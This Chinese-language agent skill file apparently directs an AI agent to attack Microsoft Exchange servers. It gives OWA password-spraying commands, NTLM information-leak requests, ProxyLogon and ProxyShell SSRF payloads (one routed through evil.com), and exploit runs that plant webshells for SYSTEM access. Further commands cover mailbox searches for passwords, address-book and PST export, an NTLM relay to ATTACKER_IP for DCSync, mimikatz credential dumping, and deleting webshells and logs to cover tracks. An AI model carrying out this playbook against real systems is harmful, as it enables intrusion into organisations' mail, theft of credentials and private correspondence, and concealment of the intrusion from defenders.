---
name: exchange-attack
description: "Microsoft Exchange 邮件服务器攻击方法论。当发现 OWA(Outlook Web App) 登录页面、Exchange 管理面板、443 端口运行 Exchange、或内网中发现 Exchange 服务器时使用。当端口扫描发现 25/443/587/993/995 且指纹为 Exchange 时使用。覆盖 OWA 密码喷洒、ProxyLogon(CVE-2021-26855)、ProxyShell(CVE-2021-34473)、ProxyNotShell(CVE-2022-41040)、邮箱搜索导出、GAL 全局地址簿提取、NTLM 中继到 Exchange。Exchange 是域渗透中最高价值的目标之一——可获取域管邮箱、提取全员通讯录、获取 SYSTEM 权限。发现任何 /owa /ecp /autodiscover /mapi 路径时都应使用此 skill"
metadata:
  tags: "exchange,owa,ecp,proxylogon,proxyshell,proxynotshell,outlook,邮件,autodiscover,NTLM,域渗透,CVE-2021-26855"
  category: "lateral"
---

# Exchange 邮件服务器攻击方法论

Exchange 在域环境中地位极高——通常拥有 Domain Admin 级权限、存储全公司邮件、保存全员通讯录。攻下 Exchange 几乎等于拿下整个域。

## Phase 0: 发现与指纹

### 0.1 Exchange 路径探测

```bash
# 常见 Exchange 路径
curl -sk https://TARGET/owa           # Outlook Web App
curl -sk https://TARGET/ecp           # Exchange Control Panel（管理）
curl -sk https://TARGET/autodiscover/autodiscover.xml
curl -sk https://TARGET/mapi/nspi     # MAPI/HTTP
curl -sk https://TARGET/rpc           # RPC over HTTP
curl -sk https://TARGET/oab           # Offline Address Book
curl -sk https://TARGET/ews           # Exchange Web Services

# 版本识别（从 OWA 页面或 HTTP 头提取）
curl -sk https://TARGET/owa -D- | grep -i "x-owa-version\|x-feserver"
```

### 0.2 版本与补丁判断

| Build 版本 | Exchange 版本 | 关键 CVE |
|------------|---------------|----------|
| 15.0.x | Exchange 2013 | ProxyLogon, ProxyShell |
| 15.1.x | Exchange 2016 | ProxyLogon, ProxyShell, ProxyNotShell |
| 15.2.x | Exchange 2019 | ProxyLogon, ProxyShell, ProxyNotShell |

## Phase 1: OWA 密码喷洒

OWA 是域凭据认证，成功登录 = 获得域用户凭据。

```bash
# 使用 spray 工具
spray -owa2 https://TARGET/owa -u users.txt -p 'P@ssword123'

# 使用 MailSniper
Invoke-PasswordSprayOWA -ExchHostname TARGET -UserList users.txt -Password 'Summer2024!'

# 使用 ruler
ruler -k --domain TARGET --username user@domain.com --password 'Pass123' brute

# 使用 nxc (NetExec)
nxc owa TARGET -u users.txt -p passwords.txt --module owa

# 用户名来源：
# 1. GAL 提取（如果有一个低权限账户）
# 2. LinkedIn OSINT → 推测邮箱格式
# 3. /autodiscover + NTLM → 域名获取
```

### NTLM 信息泄露

```bash
# 通过 NTLM 认证握手提取域信息
curl -sk https://TARGET/autodiscover/autodiscover.xml -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" -D-
# 从 NTLM Challenge 响应中解码出：域名、服务器名、DNS 域名
# 使用 ntlm_challenger.py 或手动解码 Base64

# 或用 nmap
nmap -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/owa TARGET
```

## Phase 2: ProxyLogon (CVE-2021-26855 + CVE-2021-27065)

### 2.1 漏洞检测

```bash
# SSRF 检测
curl -sk "https://TARGET/owa/auth/x.js" \
  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=TARGET/ecp/default.flt?~3" \
  -D-
# 200 状态码 + Exchange 管理页面内容 → 存在漏洞

# 或用 nmap 脚本
nmap -p 443 --script http-vuln-cve2021-26855 TARGET
```

### 2.2 利用

```bash
# 使用 proxylogon exploit
python3 proxylogon.py -t https://TARGET -e admin@domain.com

# 步骤：
# 1. SSRF 获取后端管理员 SID
# 2. 用 SID 伪造 ECP Session
# 3. 通过 ECP 写入 webshell（OAB VirtualDirectory）
# 4. 访问 webshell 获取 SYSTEM 权限

# 清理痕迹
# 删除写入的 aspx webshell
# 清理 ECP Activity log
```

## Phase 3: ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)

```bash
# 检测 — 访问 autodiscover
curl -sk "https://TARGET/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
# 200 且返回 JSON → 存在 SSRF

# 利用 — 通常使用现成 exploit
python3 proxyshell_rce.py -u https://TARGET -e admin@domain.com

# 步骤：
# 1. /autodiscover SSRF → 获取 LegacyDN + SID
# 2. 用 SID 获取 EWS 访问权限（降权到 SYSTEM）
# 3. 通过 PowerShell Remoting 写 webshell
```

## Phase 4: 邮箱搜索与数据提取

登录 OWA 或拿到 EWS 权限后：

### 4.1 搜索敏感邮件

```powershell
# 使用 MailSniper 搜索关键词
Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname TARGET \
  -Terms "密码","password","VPN","key","secret","credentials"

# 使用 EWS API 搜索
# 搜索主题含关键词的邮件
```

### 4.2 GAL 全局地址簿提取

```bash
# 获取所有域用户邮箱（用于后续密码喷洒/钓鱼）
# MailSniper
Get-GlobalAddressList -ExchHostname TARGET -UserName user@domain.com -Password 'Pass123'

# 通过 OAB（Offline Address Book）
curl -sk https://TARGET/oab/ --ntlm -u 'domain\user:Pass123'

# 导出用户列表用于密码喷洒
```

### 4.3 邮件导出

```powershell
# 导出指定用户邮箱（需要管理员权限）
New-MailboxExportRequest -Mailbox admin@domain.com -FilePath \\exchange\c$\temp\admin.pst
# 或通过 EWS 逐封下载
```

## Phase 5: Exchange 到域控

### 5.1 Exchange 权限提升

Exchange 服务器默认是 `Exchange Windows Permissions` 组成员，该组对域有 WriteDACL 权限：

```bash
# 使用 privexchange（CVE-2019-0686/0724 类似思路）
# Exchange → 强制认证到攻击者 → NTLM 中继到 LDAP → 给自己加 DCSync 权限
python3 privexchange.py -ah ATTACKER_IP TARGET -u user -p 'Pass123' -d domain.local

# 结合 ntlmrelayx
ntlmrelayx.py -t ldap://DC_IP --escalate-user compromised_user
```

### 5.2 Exchange 服务器本地提权

```bash
# Exchange 服务器通常以 SYSTEM 运行
# 通过 webshell → SYSTEM 权限 → 导出内存/凭据
# 使用 mimikatz 或 SafetyKatz 提取凭据
# 可能直接获取域管 NTLM Hash
```

## 决策树

```
发现 Exchange (OWA/ECP)
├── 版本识别 → 检查 ProxyLogon/ProxyShell/ProxyNotShell
│   ├── 存在漏洞 → RCE → SYSTEM → 域控
│   └── 已打补丁 → 继续
├── NTLM 信息泄露 → 获取域名
├── OWA 密码喷洒 → 获取域凭据
│   ├── 成功 → 登录 OWA → 搜索敏感邮件
│   ├── 成功 → GAL 提取 → 更多用户名 → 更多喷洒
│   └── 失败 → 尝试 /autodiscover NTLM 喷洒
├── 有凭据后 → EWS/PowerShell 远程管理
└── 高权限 → privexchange → DCSync
```
